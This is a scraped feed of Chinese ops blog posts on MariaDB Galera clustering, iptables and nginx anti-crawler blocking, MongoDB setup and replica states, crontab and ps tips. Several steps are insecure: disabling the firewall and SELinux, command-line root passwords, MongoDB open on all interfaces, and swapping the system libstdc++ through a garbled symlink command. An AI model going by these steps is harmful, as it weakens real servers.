Cluster部署","slug":"MariaDB-Galera-Cluster部署","date":"2018-06-14T08:46:11.000Z","updated":"2018-06-14T10:24:29.444Z","comments":true,"path":"2018/06/14/MariaDB-Galera-Cluster部署/","link":"","permalink":"https://garywu520.github.io/2018/06/14/MariaDB-Galera-Cluster%E9%83%A8%E7%BD%B2/","excerpt":"1MariaDB作为Mysql的一个分支，在开源项目中已经广泛使用，例如大热的openstack，所以，为了保证服务的高可用性，同时提高系统的负载能力，集群部署是必不可少的。 MariaDB Galera Cluster 介绍1MariaDB集群是MariaDB同步多主机集群。它仅支持XtraDB&#x2F; InnoDB存储引擎（虽然有对MyISAM实验支持 - 看wsrep_replicate_myisam系统变量）。","text":"1MariaDB作为Mysql的一个分支，在开源项目中已经广泛使用，例如大热的openstack，所以，为了保证服务的高可用性，同时提高系统的负载能力，集群部署是必不可少的。 MariaDB Galera Cluster 介绍1MariaDB集群是MariaDB同步多主机集群。它仅支持XtraDB&#x2F; InnoDB存储引擎（虽然有对MyISAM实验支持 - 看wsrep_replicate_myisam系统变量）。 主要功能123456- 同步复制- 真正的multi-master，即所有节点可以同时读写数据库- 自动的节点成员控制，失效节点自动被清除- 新节点加入数据自动复制- 真正的并行复制，行级- 用户可以直接连接集群，使用感受上与MySQL完全一致 优势12345因为是多主，所以不存在Slavelag(延迟)不存在丢失事务的情况同时具有读和写的扩展能力更小的客户端延迟节点间数据是同步的,而Master&#x2F;Slave模式是异步的,不同slave上的binlog可能是不同的 技术123Galera集群的复制功能基于Galeralibrary实现,为了让MySQL与Galera library通讯，特别针对MySQL开发了wsrep API。Galera插件保证集群同步数据，保持数据的一致性，靠的就是可认证的复制，工作原理如下图： 123当客户端发出一个commit的指令，在事务被提交之前，所有对数据库的更改都会被 write-set 收集起来,并且将 write-set 记录的内容发送给其他节点。write-set 将在每个节点进行认证测试，测试结果决定着节点是否应用write-set更改数据。如果认证测试失败，节点将丢弃 write-set ；如果认证测试成功，则事务提交。 集群部署安装环境准备1安装MariaDB集群至少需要3台服务器（如果只有两台的话需要特殊配置，请参照官方文档） 官方文档：链接 1234操作系统版本：CentOS7node1:10.128.20.16 node2:10.128.20.17 node3:10.128.20.18 3节点配置hosts 12310.128.20.16 node110.128.20.17 node210.128.20.18 node3 禁用防火墙和selinux 12(1)为了保证节点间相互通信，需要禁用防火墙设置（如果需要防火墙，则参照官方网站增加防火墙信息设置）(2)禁用selinux 安装MariaDB配置MariaDB YUM源 1官方源配置向导：https:&#x2F;&#x2F;link.jianshu.com&#x2F;?t&#x3D;https:&#x2F;&#x2F;downloads.mariadb.org&#x2F;mariadb&#x2F;repositories 12345678910官方源vim &#x2F;etc&#x2F;yum.repos.d&#x2F;mariadb.repo# MariaDB 10.0 CentOS repository list - created 2018-06-14 08:14 UTC# http:&#x2F;&#x2F;downloads.mariadb.org&#x2F;mariadb&#x2F;repositories&#x2F;[mariadb]name &#x3D; MariaDBbaseurl &#x3D; http:&#x2F;&#x2F;yum.mariadb.org&#x2F;10.0&#x2F;centos7-amd64gpgkey&#x3D;https:&#x2F;&#x2F;yum.mariadb.org&#x2F;RPM-GPG-KEY-MariaDBgpgcheck&#x3D;1 12345678国内源vim &#x2F;etc&#x2F;yum.repos.d&#x2F;mariadb.repo[mariadb]name &#x3D; MariaDBbaseurl &#x3D; http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;mariadb&#x2F;yum&#x2F;10.2&#x2F;centos7-amd64&#x2F;gpgkey&#x3D;http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;mariadb&#x2F;yum&#x2F;RPM-GPG-KEY-MariaDBgpgcheck&#x3D;1 安装MariaDB-10.0 1yum install -y mariadb mariadb-galera-server mariadb-galera-common galera rsync 初始化服务(只在node1节点执行) 12systemctl start mariadbmysql_secure_installation 关闭node1节点数据库，修改 /etc/my.cnf.d/galera.cnf 12systemctl stop mariadbvim &#x2F;etc&#x2F;my.cnf.d&#x2F;galera.cnf #修改内容如下 123456789[mysqld]......wsrep_provider &#x3D; &#x2F;usr&#x2F;lib64&#x2F;galera&#x2F;libgalera_smm.sowsrep_cluster_address &#x3D; &quot;gcomm:&#x2F;&#x2F;node1,node2,node3&quot;wsrep_node_name &#x3D; node1wsrep_node_address&#x3D;10.128.20.16#wsrep_provider_options&#x3D;&quot;socket.ssl_key&#x3D;&#x2F;etc&#x2F;pki&#x2F;galera&#x2F;galera.key; socket.ssl_cert&#x3D;&#x2F;etc&#x2F;pki&#x2F;galera&#x2F;galera.crt;&quot;提示：如果不用ssl的方式认证的话，请把 wsrep_provider_options 注释掉。 1将此文件复制到node2、node3，注意要把 wsrep_node_name 和 wsrep_node_address 改成相应节点的 hostname 和 ip。 启动集群12node1 启动 MariaDB Galera Cluster 服务&#x2F;usr&#x2F;libexec&#x2F;mysqld --wsrep-new-cluster --user&#x3D;root &amp; 12345678观察日志：[root@node4 ~]# tail -f &#x2F;var&#x2F;log&#x2F;mariadb&#x2F;mariadb.log150701 19:54:17 [Note] WSREP: wsrep_load(): loading provider library &#39;none&#39;150701 19:54:17 [Note] &#x2F;usr&#x2F;libexec&#x2F;mysqld: ready for connections.Version: &#39;5.5.40-MariaDB-wsrep&#39; socket: &#39;&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql.sock&#39; port: 3306 MariaDB Server, wsrep_25.11.r4026当出现 ready for connections ,证明我们启动成功 继续启动node2和node3节点 12345systemctl start mariadb可以查看 &#x2F;var&#x2F;log&#x2F;mariadb&#x2F;mariadb.log，在日志可以看到节点均加入了集群中。警告⚠：--wsrep-new-cluster 这个参数只能在初始化集群使用，且只能在一个节点使用。 查看集群12mysql -uroot -p&gt;SHOW STATUS LIKE &#96;wsrep_%&#96;; 123456我们可以关注几个关键的参数：wsrep_connected &#x3D; on 链接已开启wsrep_local_index &#x3D; 1 在集群中的索引值wsrep_cluster_size &#x3D;3 集群中节点的数量wsrep_incoming_addresses &#x3D; 10.128.20.17:3306,10.128.20.16:3306,10.128.20.18:3306 集群中节点的访问地址 验证数据同步1我们在 node1 上新建数据库 galera_test ,然后在 node2 和 node3 上查询，如果可以查询到 galera_test 这个库，说明数据同步成功，集群运行正常。 1[root@node1 ~]# mysql -uroot -proot -e &quot;create database galera_test&quot; 123456789[root@node2 ~]# mysql -uroot -proot -e &quot;show databases&quot;+--------------------+| Database |+--------------------+| information_schema || galera_test || mysql || performance_schema |+--------------------+ 123456789[root@node3 ~]# mysql -uroot -proot -e &quot;show databases&quot;+--------------------+| Database |+--------------------+| information_schema || galera_test || mysql || performance_schema |+--------------------+ 至此，我们的 MariaDB Galera Cluster 已经成功部署。 参考：OpenARM","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"MySQL","slug":"MySQL","permalink":"https://garywu520.github.io/tags/MySQL/"},{"name":"MariaDB","slug":"MariaDB","permalink":"https://garywu520.github.io/tags/MariaDB/"},{"name":"Galera","slug":"Galera","permalink":"https://garywu520.github.io/tags/Galera/"},{"name":"Cluster","slug":"Cluster","permalink":"https://garywu520.github.io/tags/Cluster/"}]},{"title":"nginx日志配合iptables封IP防CC攻击","slug":"nginx日志配合iptables封IP防CC攻击","date":"2018-06-12T07:30:44.000Z","updated":"2018-06-12T08:30:07.776Z","comments":true,"path":"2018/06/12/nginx日志配合iptables封IP防CC攻击/","link":"","permalink":"https://garywu520.github.io/2018/06/12/nginx%E6%97%A5%E5%BF%97%E9%85%8D%E5%90%88iptables%E5%B0%81IP%E9%98%B2CC%E6%94%BB%E5%87%BB/","excerpt":"1通过分析nginx日志找出请求数较大的IP，并用iptables封掉。 编写脚本 123456789101112131415#!&#x2F;bin&#x2F;bash#定义访问次数上限100num&#x3D;100LOG_DIR&#x3D;&#x2F;var&#x2F;log&#x2F;nginxcd $LOG_DIR#定义筛选访问量＞100的IP地址IP&#x3D;&#96;tail access.log -n 1000|awk &#39;&#123;print $1&#125;&#39;|sort|uniq -c|sort -rn|awk &#39;&#123;if ($1&gt;&#39;$num&#39;)&#123;print $2&#125;&#125;&#39;&#96;for i in $IP#读取最新1000条记录，如果单IP超过100条就封掉。do iptables -I INPUT -p tcp -s $i --dport 80 -j DROPdone","text":"1通过分析nginx日志找出请求数较大的IP，并用iptables封掉。 编写脚本 123456789101112131415#!&#x2F;bin&#x2F;bash#定义访问次数上限100num&#x3D;100LOG_DIR&#x3D;&#x2F;var&#x2F;log&#x2F;nginxcd $LOG_DIR#定义筛选访问量＞100的IP地址IP&#x3D;&#96;tail access.log -n 1000|awk &#39;&#123;print $1&#125;&#39;|sort|uniq -c|sort -rn|awk &#39;&#123;if ($1&gt;&#39;$num&#39;)&#123;print $2&#125;&#125;&#39;&#96;for i in $IP#读取最新1000条记录，如果单IP超过100条就封掉。do iptables -I INPUT -p tcp -s $i --dport 80 -j DROPdone 配置crontab 12#5分钟执行一次*&#x2F;5 * * * * sh &#x2F;path&#x2F;deny.sh","categories":[],"tags":[{"name":"CC","slug":"CC","permalink":"https://garywu520.github.io/tags/CC/"},{"name":"Ddos","slug":"Ddos","permalink":"https://garywu520.github.io/tags/Ddos/"},{"name":"nginx日志","slug":"nginx日志","permalink":"https://garywu520.github.io/tags/nginx%E6%97%A5%E5%BF%97/"},{"name":"高积运维","slug":"高积运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%A7%AF%E8%BF%90%E7%BB%B4/"}]},{"title":"Nginx反爬虫","slug":"Nginx反爬虫","date":"2018-06-12T03:09:14.000Z","updated":"2018-06-12T04:03:46.602Z","comments":true,"path":"2018/06/12/Nginx反爬虫/","link":"","permalink":"https://garywu520.github.io/2018/06/12/Nginx%E5%8F%8D%E7%88%AC%E8%99%AB/","excerpt":"1Nginx被爬虫的服务器，会在某个时间点CPU占用骤增, 不同时间段CPU占用较高（也可能会出现内存溢出等问题）。如果服务器有web业务，那么基本可以确定被爬虫了...","text":"1Nginx被爬虫的服务器，会在某个时间点CPU占用骤增, 不同时间段CPU占用较高（也可能会出现内存溢出等问题）。如果服务器有web业务，那么基本可以确定被爬虫了... 反爬虫首先对爬虫IP进行屏蔽12345678910策略: 通过awk筛选日志，找出访问量较高的可以IP地址进行屏蔽。(1)查找要禁止的IP:awk &#39;&#123;print $1&#125;&#39; &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log|sort |uniq -c|sort -rn(2)屏蔽IP或IP段在nginx server区段添加如下即可：deny 5.188.211.72;或deny 5.188.211.70&#x2F;32; Nginx判断UA处理反爬虫1这个时候就有充足的时间通过一些手段进行反爬虫处理了... 将下面的if语句放在nginx配置文件的server或者location代码区域内【不能放在http区域】。 12345#禁止指定UA及UA为空的访问(常见UA列表详见附录)if ($http_user_agent ~* &quot;Applebot|SEOkicks-Robot|DotBot|YunGuanCe|Exabot|spiderman|Scrapy|HttpClient|Teleport|TeleportPro|SiteExplorer|WBSearchBot|Elefent|psbot|TurnitinBot|wsAnalyzer|ichiro|ezooms|FeedDemon|Indy Library|Alexa Toolbar|AskTbFXTV|AhrefsBot|CrawlDaddy|CoolpadWebkit|Java|Feedly|UniversalFeedParser|ApacheBench|Microsoft URL Control|Swiftbot|ZmEu|oBot|jaunty|Python-urllib|lightDeckReports Bot|YYSpider|DigExt|HttpClient|MJ12bot|heritrix|EasouSpider|Ezooms|^$&quot;) &#123; return 403;&#125; 生效 12添加此配置之后，验证语法：nginx -t 无误后,重载Nginx配置: nginx -s reload 测试 12345curl -I -A &quot;spiderman&quot; https:&#x2F;&#x2F;xx.xxx.com或curl -I -A &quot;YunGuanCe&quot; https:&#x2F;&#x2F;xx.xxx.com如果返回403的输出，则说明配置已经生效了 自行筛选屏蔽UA1234log筛选命令：cat access.log|awk -F &#39;&quot;&#39; &#39;&#123;print $6&#125;&#39;|sort|uniq -c |sort -rn|head -20将可疑的UA加入以上屏蔽列表即可。 附录：常见的爬虫UA常见搜索引擎爬虫的User-Agent 12345678910111213141516171819202122232425百度爬虫Baiduspider+(+http:&#x2F;&#x2F;www.baidu.com&#x2F;search&#x2F;spider.htm”)Google爬虫Mozilla&#x2F;5.0 (compatible; Googlebot&#x2F;2.1; +http:&#x2F;&#x2F;www.google.com&#x2F;bot.html)Googlebot&#x2F;2.1 (+http:&#x2F;&#x2F;www.googlebot.com&#x2F;bot.html)Googlebot&#x2F;2.1 (+http:&#x2F;&#x2F;www.google.com&#x2F;bot.html)雅虎爬虫(分别是雅虎中国和美国总部的爬虫)Mozilla&#x2F;5.0 (compatible; Yahoo! Slurp China; http:&#x2F;&#x2F;misc.yahoo.com.cn&#x2F;help.html”)Mozilla&#x2F;5.0 (compatible; Yahoo! Slurp; http:&#x2F;&#x2F;help.yahoo.com&#x2F;help&#x2F;us&#x2F;ysearch&#x2F;slurp”)新浪爱问爬虫iaskspider&#x2F;2.0(+http:&#x2F;&#x2F;iask.com&#x2F;help&#x2F;help_index.html”)Mozilla&#x2F;5.0 (compatible; iaskspider&#x2F;1.0; MSIE 6.0)搜狗爬虫Sogou web spider&#x2F;3.0(+http:&#x2F;&#x2F;www.sogou.com&#x2F;docs&#x2F;help&#x2F;webmasters.htm#07″)Sogou Push Spider&#x2F;3.0(+http:&#x2F;&#x2F;www.sogou.com&#x2F;docs&#x2F;help&#x2F;webmasters.htm#07″)网易爬虫Mozilla&#x2F;5.0 (compatible; YodaoBot&#x2F;1.0; http:&#x2F;&#x2F;www.yodao.com&#x2F;help&#x2F;webmaster&#x2F;spider&#x2F;”; )MSN爬虫msnbot&#x2F;1.0 (+http:&#x2F;&#x2F;search.msn.com&#x2F;msnbot.htm”) 网络上常见的垃圾UA列表 123456789101112131415161718192021222324252627282930313233内容采集： FeedDemon Java 内容采集 Jullo 内容采集 Feedly 内容采集 UniversalFeedParser 内容采集SQL注入： BOT&#x2F;0.1 (BOT for JCE) CrawlDaddy无用爬虫: EasouSpider Swiftbot YandexBot AhrefsBot jikeSpider MJ12bot YYSpider oBot CC攻击器: ApacheBench WinHttpTCP攻击: HttpClient扫描: Microsoft URL Control ZmEu phpmyadmin jaunty 参考：运维之美","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"nginx反爬虫","slug":"nginx反爬虫","permalink":"https://garywu520.github.io/tags/nginx%E5%8F%8D%E7%88%AC%E8%99%AB/"},{"name":"蜘蛛","slug":"蜘蛛","permalink":"https://garywu520.github.io/tags/%E8%9C%98%E8%9B%9B/"},{"name":"User Agent","slug":"User-Agent","permalink":"https://garywu520.github.io/tags/User-Agent/"},{"name":"垃圾UA","slug":"垃圾UA","permalink":"https://garywu520.github.io/tags/%E5%9E%83%E5%9C%BEUA/"}]},{"title":"mongodb单机版安装","slug":"mongodb单机版安装","date":"2018-06-08T01:58:30.000Z","updated":"2018-06-08T02:00:13.122Z","comments":true,"path":"2018/06/08/mongodb单机版安装/","link":"","permalink":"https://garywu520.github.io/2018/06/08/mongodb%E5%8D%95%E6%9C%BA%E7%89%88%E5%AE%89%E8%A3%85/","excerpt":"下载 12cd rootwget https:&#x2F;&#x2F;fastdl.mongodb.org&#x2F;linux&#x2F;mongodb-linux-x86_64-amazon-3.2.0.tgz 解压 1tar -zxvf mongodb-linux-x86_64-amazon-3.2.0.tgz","text":"下载 12cd rootwget https:&#x2F;&#x2F;fastdl.mongodb.org&#x2F;linux&#x2F;mongodb-linux-x86_64-amazon-3.2.0.tgz 解压 1tar -zxvf mongodb-linux-x86_64-amazon-3.2.0.tgz 剪切MongoDB到/usr/local目录中 1mv mongodb-linux-x86_64-amazon-3.2.0 &#x2F;usr&#x2F;local&#x2F;mongodb 创建MongoDB数据库和日志存放路径 12345678mkdir -p &#x2F;data&#x2F;mongodbmkdir -p &#x2F;var&#x2F;log&#x2F;mongodbmkdir -p &#x2F;var&#x2F;run&#x2F;mongodbtouch &#x2F;var&#x2F;log&#x2F;mongodb&#x2F;mongodb.log注：(1)这个log文件必须事先创建且存在(2)如果mongodb以其他用户启动，该用户需具有所有相关目录和文件的属主权限 启动 1234567891011121314151617181920vim &#x2F;usr&#x2F;local&#x2F;mongodb&#x2F;config.conf## 配置文件内容pidfilepath &#x3D; &#x2F;var&#x2F;run&#x2F;mongodb&#x2F;mongodb.piddbpath &#x3D; &#x2F;data&#x2F;mongodblogpath &#x3D; &#x2F;var&#x2F;log&#x2F;mongodb&#x2F;mongodb.loglogappend &#x3D; truebind_ip &#x3D; 0.0.0.0port &#x3D; 27017fork &#x3D; true#declare this is a config db of a cluster;configsvr &#x3D; true#副本集名称replSet&#x3D;configs#设置最大连接数maxConns&#x3D;20000 启动 1&#x2F;usr&#x2F;local&#x2F;mongodb&#x2F;bin&#x2F;mongod -f &#x2F;usr&#x2F;local&#x2F;mongodb&#x2F;config.conf 1234停止mongo服务&#x2F;usr&#x2F;local&#x2F;mongodb&#x2F;bin&#x2F;mongod -f &#x2F;usr&#x2F;local&#x2F;mongodb&#x2F;config.conf --shutdown注意：禁止使用kill -9 &lt;pid&gt; 的方式把进程结束掉,会造成数据丢失！ 启动故障-解决方案 1234567891011121314151617181920212223启动错误：mongod: &#x2F;usr&#x2F;lib64&#x2F;libstdc++.so.6: version &#96;CXXABI_1.3.5&#39; not found (required by mongod)mongod: &#x2F;usr&#x2F;lib64&#x2F;libstdc++.so.6: version &#96;GLIBCXX_3.4.15&#39; not found (required by mongod)mongod: &#x2F;usr&#x2F;lib64&#x2F;libstdc++.so.6: version &#96;GLIBCXX_3.4.14&#39; not found (required by mongod)解决方法：查看动态库版本strings &#x2F;usr&#x2F;lib64&#x2F;libstdc++.so.6 | grep GLIBC 查找动态库文件find &#x2F; -name &quot;libstdc++.so*&quot; 备份现有的libstdc++.so.6mv &#x2F;usr&#x2F;lib64&#x2F;libstdc++.so.6 &#x2F;usr&#x2F;lib64&#x2F;libstdc++.so.6.bak 软链最新的动态库文件ln -sv ln -sv &#x2F;usr&#x2F;local&#x2F;androidSDK&#x2F;tools&#x2F;lib64&#x2F;libstdc++&#x2F;libstdc++.so.6.0.18 &#x2F;usr&#x2F;lib64&#x2F;libstdc++.so.6 &#x2F;usr&#x2F;lib64&#x2F;libstdc++.so.6再次查看动态库版本strings &#x2F;usr&#x2F;lib64&#x2F;libstdc++.so.6 | grep GLIBC 再次启动mongodb 验证启动 1netstat -lntup|grep 27017 Mongo服务启动脚本 1不多说，网上down脚本，按照配置文件指定参数进行对应替换即可 连接 1&#x2F;usr&#x2F;local&#x2F;mongodb&#x2F;bin&#x2F;mongo ip:port","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Mongodb","slug":"Mongodb","permalink":"https://garywu520.github.io/tags/Mongodb/"},{"name":"mongod","slug":"mongod","permalink":"https://garywu520.github.io/tags/mongod/"},{"name":"二进制版","slug":"二进制版","permalink":"https://garywu520.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%89%88/"}]},{"title":"单独运行shell脚本与crontab运行shell脚本的区别","slug":"单独运行shell脚本与crontab运行shell脚本的区别","date":"2018-06-02T00:10:57.000Z","updated":"2018-06-02T00:19:50.923Z","comments":true,"path":"2018/06/02/单独运行shell脚本与crontab运行shell脚本的区别/","link":"","permalink":"https://garywu520.github.io/2018/06/02/%E5%8D%95%E7%8B%AC%E8%BF%90%E8%A1%8Cshell%E8%84%9A%E6%9C%AC%E4%B8%8Ecrontab%E8%BF%90%E8%A1%8Cshell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%8C%BA%E5%88%AB/","excerpt":"12crontab运行脚本存在两大问题：环境变量和路径.现象：单独运行脚本没问题，但用crontab定时运行脚本就报错，cron日志只显示执行过了命令，但运行结果不是我们想要的，因为中间过程中出现了错误。","text":"12crontab运行脚本存在两大问题：环境变量和路径.现象：单独运行脚本没问题，但用crontab定时运行脚本就报错，cron日志只显示执行过了命令，但运行结果不是我们想要的，因为中间过程中出现了错误。 环境变量12345常常写脚本，要能够基本判断某个命令是否是shell内部命令（所支持的命令），外部命令在脚本中需要使用命令绝对路径，否则crontab去执行这个脚本时会出现错误。外部命令如：python、jq等等解决方法：命令使用绝对路径即可（可使用which命令查看）","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"},{"name":"crontab","slug":"crontab","permalink":"https://garywu520.github.io/tags/crontab/"},{"name":"外部命令","slug":"外部命令","permalink":"https://garywu520.github.io/tags/%E5%A4%96%E9%83%A8%E5%91%BD%E4%BB%A4/"},{"name":"内部命令","slug":"内部命令","permalink":"https://garywu520.github.io/tags/%E5%86%85%E9%83%A8%E5%91%BD%E4%BB%A4/"}]},{"title":"MongoDB副本集成员状态","slug":"MongoDB副本集成员状态","date":"2018-05-29T09:38:59.000Z","updated":"2018-05-29T09:50:35.281Z","comments":true,"path":"2018/05/29/MongoDB副本集成员状态/","link":"","permalink":"https://garywu520.github.io/2018/05/29/MongoDB%E5%89%AF%E6%9C%AC%E9%9B%86%E6%88%90%E5%91%98%E7%8A%B6%E6%80%81/","excerpt":"1副本集的每个成员都有一个状态，反映了它在集合中的配置情况。 数字 名称 状态描述 0 STARTUP 还不是任何集合的活动成员。所有的成员启动在该状态。在STARTUP状态mongod解析副本集配置文档。 1 PRIMARY 处于PRIMARY状态的成员是唯一能接受写操作的成员。 2 SECONDARY 处于SECONDARY状态的成员复制数据存储。数据可用于读，尽管可能比较旧。 3 RECOVERING 可以选举。成员要么实施启动自检测，或完成回滚或重新同步的转换。 5 STARTUP2 成员加入了集合，正运行初始化同步。 6 UNKNOWN 成员的状态，正如从集合的另一个成员中所看到的，未知。 7 ARBITER 仲裁不复制数据，而仅仅参与选举。 8 DOWN 该成员，正如从集合的立即你跟一个成员所见，不可达。 9 ROLLBACK 该成员正在实施回滚。数据不可读。 10 REMOVED 成员曾今在副本集但随后被移除。","text":"1副本集的每个成员都有一个状态，反映了它在集合中的配置情况。 数字 名称 状态描述 0 STARTUP 还不是任何集合的活动成员。所有的成员启动在该状态。在STARTUP状态mongod解析副本集配置文档。 1 PRIMARY 处于PRIMARY状态的成员是唯一能接受写操作的成员。 2 SECONDARY 处于SECONDARY状态的成员复制数据存储。数据可用于读，尽管可能比较旧。 3 RECOVERING 可以选举。成员要么实施启动自检测，或完成回滚或重新同步的转换。 5 STARTUP2 成员加入了集合，正运行初始化同步。 6 UNKNOWN 成员的状态，正如从集合的另一个成员中所看到的，未知。 7 ARBITER 仲裁不复制数据，而仅仅参与选举。 8 DOWN 该成员，正如从集合的立即你跟一个成员所见，不可达。 9 ROLLBACK 该成员正在实施回滚。数据不可读。 10 REMOVED 成员曾今在副本集但随后被移除。 核心状态PRIMARY12处于PRIMARY状态的成员接受写操作。一个副本集每次最多只有一个主成员。在一次选举后，一个SECONDARY状态成员成为主成员。处于PRIMARY状态的成员有资格选举。 SECONDARY1处于SECONDARY状态的成员复制主成员的数据集合，并可以被配置为接受读操作。辅助成员有资格在选举中投票，如果主成员不可用，会被选举为PRIMARY状态。 ARBITER1处于ARBITER状态的成员不复制数据，也不接受写操作。它们有资格选举，仅仅存在于选举中决胜负。如果集合要么有大量的成员，并能够参与决胜选举，否则副本集应该只有一个成员处于ARBITER状态。在任何副本集中最多只有一个仲裁被配置。 其他状态STARTUP1副本集的每个成员以STARTUP状态启动。Mongod然后加载成员的副本集配置，成员的状态转化为STARTUP2。在STARTUP状态的成员没有资格选举，因为它们不被人为是任何副本集的成员。 STARTUP21一旦mongod加载成员配置完成，副本集的每个成员就进入STARTUP2状态，在此时它开始成员副本集的一个活动成员。成员然后决定是否需要初始化同步。如果一个成员开始初始化同步，成员保持STARTUP2状态直到所有数据拷贝完成所有索引创建完成。之后，成员转换为RECOVERING状态。 RECOVERING123当副本集成员不准备接受读取时，它进入RECOVERING状态。RECOVERING状态发生在正常操作期间，不必显示一个错误条件。处于RECOVERING状态的成员有资格在选举中投票，但是没有资格进入PRIMARY状态。在复制足够的数据给客户端所需读取数据的一致性视图，成员便从RECOVERING状态转为SECONDARY状态。在RECOVERING和SECONDARY状态之间的唯一区别是，RECOVERING阻止客户端读取，SECONDARY运行读取。SECONDARY状态并不保证主成员数据陈旧化。 1注：关于负载，一个辅助成员可能会远远落后于副本集的其他成员，以至于它可能需要重新同步数据到副本集。当这种情况发生时，成员进入RECOVERING状态，并需要手工干预。 错误状态1处于错误状态的成员不能选举。 UNKNOWN1从没交流状态信息到副本集的成员会处于UNKNOWN状态。 DOWN1丢失到副本集连接的成员被集合的剩余成员看作为DOWN状态。 REMOVED1从副本集移除的成员进入REMOVED状态。当成员进入REMOVED状态，日志将会标记replset REMOVED消息事件。 ROLLBACK1当副本集在选举中替换掉主成员，旧的主成员可能包含不会复制到辅助成员的文档。在这种情况下，旧的主成员反转这些写操作。在回滚期间，成员将保持ROLLBACK状态。 FATAL1处于FATAL状态的成员触发了一个不可恢复错误。成员必需关闭并重启，可能还需要重新同步。 参考：UltraSQL","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"SECONDARY","slug":"SECONDARY","permalink":"https://garywu520.github.io/tags/SECONDARY/"},{"name":"PRIMARY","slug":"PRIMARY","permalink":"https://garywu520.github.io/tags/PRIMARY/"},{"name":"MongoDB","slug":"MongoDB","permalink":"https://garywu520.github.io/tags/MongoDB/"},{"name":"STARTUP","slug":"STARTUP","permalink":"https://garywu520.github.io/tags/STARTUP/"},{"name":"副本集成员","slug":"副本集成员","permalink":"https://garywu520.github.io/tags/%E5%89%AF%E6%9C%AC%E9%9B%86%E6%88%90%E5%91%98/"},{"name":"成员状态","slug":"成员状态","permalink":"https://garywu520.github.io/tags/%E6%88%90%E5%91%98%E7%8A%B6%E6%80%81/"}]},{"title":"ps命令查看进程启动及运行时间-linux","slug":"ps命令查看进程启动及运行时间-linux","date":"2018-05-23T02:27:26.000Z","updated":"2018-05-23T02:54:15.169Z","comments":true,"path":"2018/05/23/ps命令查看进程启动及运行时间-linux/","link":"","permalink":"https://garywu520.github.io/2018/05/23/ps%E5%91%BD%E4%BB%A4%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E5%90%AF%E5%8A%A8%E5%8F%8A%E8%BF%90%E8%A1%8C%E6%97%B6%E9%97%B4-linux/","excerpt":"123456有时候排查故障，可能需要查看下某个服务进程的启动时间与运行时间，如果进程由supervisor启动，就好办了。supervisor查看服务启动时间：supervisorctl status 如果程序没有使用supervisor启动，该怎么查看呢？","text":"123456有时候排查故障，可能需要查看下某个服务进程的启动时间与运行时间，如果进程由supervisor启动，就好办了。supervisor查看服务启动时间：supervisorctl status 如果程序没有使用supervisor启动，该怎么查看呢？ man命令查看下ps参数含义12345678910111213141516# man ps|egrep &#39;lstart|etime&#39; running during the entire lifetime of a process. This is not ideal, %t etime ELAPSED args, cmd, comm, command, fname, ucmd, ucomm, lstart, bsdstart, start. to be fully destroyed by its parent. Sometimes lstart, start, start_time, and stime. lifetime of the process. (see %cpu). etime ELAPSED elapsed time since the process was started, in etimes ELAPSED elapsed time since the process was started, in lstart STARTED time the command started. See also lstart, bsdstart, start_time, and stime. otherwise. See also bsdstart, start, lstart,可以看到官方解释：etime指: 进程启动后运行或流逝的时间lstart指: 进程启动精确时间 查看服务或进程的启动时间12# ps -eo pid,lstart,etime,cmd |grep mysql30244 Thu Feb 8 18:27:02 2018 103-16:22:50 &#x2F;bin&#x2F;mysqld_safe... 或 12# ps -eo lstart,etime,cmd |grep pid30244 Thu Feb 8 18:27:02 2018 103-16:23:27 common 参考：JAMIN ZHANG","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"ps","slug":"ps","permalink":"https://garywu520.github.io/tags/ps/"},{"name":"进程启动时间","slug":"进程启动时间","permalink":"https://garywu520.github.io/tags/%E8%BF%9B%E7%A8%8B%E5%90%AF%E5%8A%A8%E6%97%B6%E9%97%B4/"},{"name":"进程运行时间","slug":"进程运行时间","permalink":"https://garywu520.github.io/tags/%E8%BF%9B%E7%A8%8B%E8%BF%90%E8%A1%8C%E6%97%B6%E9%97%B4/"}]},{"title":"curl和wget的底层实现区别","slug":"curl和wget的底层实现区别","date":"2018-05-21T08:56:17.000Z","updated":"2018-05-21T10:01:00.530Z","comments":true,"path":"2018/05/21/curl和wget的底层实现区别/","link":"","permalink":"https://garywu520.github.io/2018/05/21/curl%E5%92%8Cwget%E7%9A%84%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0%E5%8C%BA%E5%88%AB/","excerpt":"1开发有个php程序,通过curl去调用bind dns中一个域名(2个A记录)，在某些服务器上始终只轮询落到其中一个A记录服务器（使用wget和ping不存在这个问题），具体原因后研究认定可能与路由消耗有关。但现在来说说curl和wget的区别。","text":"1开发有个php程序,通过curl去调用bind dns中一个域名(2个A记录)，在某些服务器上始终只轮询落到其中一个A记录服务器（使用wget和ping不存在这个问题），具体原因后研究认定可能与路由消耗有关。但现在来说说curl和wget的区别。 使用strace命令去跟踪整个请求过程curl1strace curl -v web.test.zone 摘出关键部分 123456789......开始部分调用了几个模块, 